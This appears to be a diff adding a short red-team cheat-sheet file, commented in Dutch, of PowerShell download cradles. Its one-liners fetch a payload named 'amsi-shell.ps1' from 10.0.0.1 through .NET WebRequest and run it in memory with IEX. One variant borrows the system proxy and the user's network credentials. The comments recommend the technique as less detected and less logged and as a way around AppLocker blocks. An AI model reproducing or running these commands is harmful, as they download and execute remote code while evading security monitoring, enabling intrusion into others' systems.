@@ -1,0 +1,7 @@
+# PowerShell Download Cradle - System.NET.WebRequest
+# Gebruikt .NET WebRequest class direct (minder common, minder gedetecteerd)
+$wr=[System.NET.WebRequest]::Create("http://10.0.0.1/payloads/amsi-shell.ps1");$r=$wr.GetResponse();IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+# Met proxy settings:
+$wr=[System.NET.WebRequest]::Create("http://10.0.0.1/payloads/amsi-shell.ps1");$wr.Proxy=[System.NET.WebRequest]::DefaultWebProxy;$wr.Proxy.Credentials=[System.NET.CredentialCache]::DefaultNetworkCredentials;$r=$wr.GetResponse();IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+# Tip: Meer low-level dan WebClient/IWR, minder gelogd
+# Tip: Goed alternatief als WebClient geblokkeerd is door AppLocker
